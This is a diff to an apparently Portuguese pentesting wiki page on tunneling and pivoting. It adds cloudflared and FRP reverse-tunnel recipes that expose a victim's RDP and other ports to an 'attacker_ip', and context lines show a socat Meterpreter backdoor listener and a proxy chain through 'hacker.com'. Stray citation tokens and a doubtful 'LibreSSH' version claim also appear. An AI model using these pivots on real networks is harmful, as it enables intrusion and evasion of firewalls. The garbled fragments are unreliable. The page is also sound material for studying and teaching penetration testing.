@@ -5,7 +5,7 @@
 ## Dica do Nmap
 
 > [!WARNING]
-> **ICMP** e **SYN** scans não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta de ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
+> **ICMP** e **SYN** scans não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta por ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
 
 ## **Bash**
 
@@ -78,7 +78,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Ative o encaminhamento no lado do Servidor
+Ative o encaminhamento no lado do servidor
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -87,9 +87,13 @@ Defina uma nova rota no lado do cliente
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Segurança – Ataque Terrapin (CVE-2023-48795)**
+> O ataque de downgrade Terrapin de 2023 pode permitir que um homem-no-meio interfira no início do handshake SSH e injete dados em **qualquer canal encaminhado** ( `-L`, `-R`, `-D` ). Certifique-se de que tanto o cliente quanto o servidor estejam corrigidos (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou desative explicitamente os algoritmos vulneráveis `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` em `sshd_config`/`ssh_config` antes de confiar em túneis SSH. citeturn4search0
+
 ## SSHUTTLE
 
-Você pode **túnel** via **ssh** todo o **tráfego** para uma **sub-rede** através de um host.\
+Você pode **tunar** via **ssh** todo o **tráfego** para uma **sub-rede** através de um host.\
 Por exemplo, encaminhando todo o tráfego que vai para 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -152,9 +156,9 @@ rportfwd stop [bind port]
 ```
 Para notar:
 
-- O **reverso de porta do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para retransmitir entre máquinas individuais**.
+- O **reencaminhamento de porta reversa do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para relatar entre máquinas individuais**.
 - O tráfego é **tuneado dentro do tráfego C2 do Beacon**, incluindo links P2P.
-- **Privilégios de administrador não são necessários** para criar reversos de porta em portas altas.
+- **Privilégios de administrador não são necessários** para criar reencaminhamentos de porta reversa em portas altas.
 
 ### rPort2Port local
 
@@ -276,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter através do SSL Socat
+### Meterpreter através de SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -290,9 +294,7 @@ Você pode contornar um **proxy não autenticado** executando esta linha em vez 
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
-
-### Túnel SSL Socat
+### SSL Socat Tunnel
 
 **/bin/sh console**
 
@@ -356,7 +358,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** informando que o **plugin SocksOverRDP está habilitado**, e ele irá **escutar** em **127.0.0.1:1080**.
 
-**Conecte-se** via **RDP** e faça o upload e execute o binário `SocksOverRDP-Server.exe` na máquina da vítima:
+**Conecte-se** via **RDP** e faça o upload e execute no computador da vítima o binário `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -392,7 +394,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Agora, se você configurar, por exemplo, no vítima o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
+Agora, se você configurar, por exemplo, no alvo, o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
 Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está escutando na porta 2222.
 
 ## YARP
@@ -496,7 +498,7 @@ chmod a+x ./ngrok
 
 **Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_Também é possível adicionar autenticação e TLS, se necessário._
+_É também possível adicionar autenticação e TLS, se necessário._
 
 #### Tunneling TCP
 ```bash
@@ -511,12 +513,12 @@ _Também é possível adicionar autenticação e TLS, se necessário._
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Captura de chamadas HTTP
+#### Sniffing HTTP calls
 
 _Utilizado para XSS, SSRF, SSTI ..._\
 Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tunelamento de serviço HTTP interno
+#### Tunneling internal HTTP service
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -541,6 +543,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+O daemon `cloudflared` da Cloudflare pode criar túneis de saída que expõem **serviços TCP/UDP locais** sem exigir regras de firewall de entrada, usando a borda da Cloudflare como ponto de encontro. Isso é muito útil quando o firewall de saída permite apenas tráfego HTTPS, mas as conexões de entrada estão bloqueadas.
+
+### Comando rápido para túnel
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 pivot
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### Túneis persistentes com DNS
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Inicie o conector:
+```bash
+cloudflared tunnel run mytunnel
+```
+Porque todo o tráfego sai do host **para fora pela porta 443**, os túneis Cloudflared são uma maneira simples de contornar ACLs de entrada ou limites de NAT. Esteja ciente de que o binário geralmente é executado com privilégios elevados – use contêineres ou a flag `--user` quando possível. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da versão **v0.53.0 (Maio de 2024)**, ele pode atuar como um **Gateway de Túnel SSH**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
+
+### Túnel TCP reverso clássico
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Usando o novo gateway SSH (sem binário frpc)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+O comando acima publica a porta da vítima **8080** como **attacker_ip:9000** sem implantar nenhuma ferramenta adicional – ideal para pivotar vivendo da terra. citeturn2search1
+
 ## Outras ferramentas para verificar
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
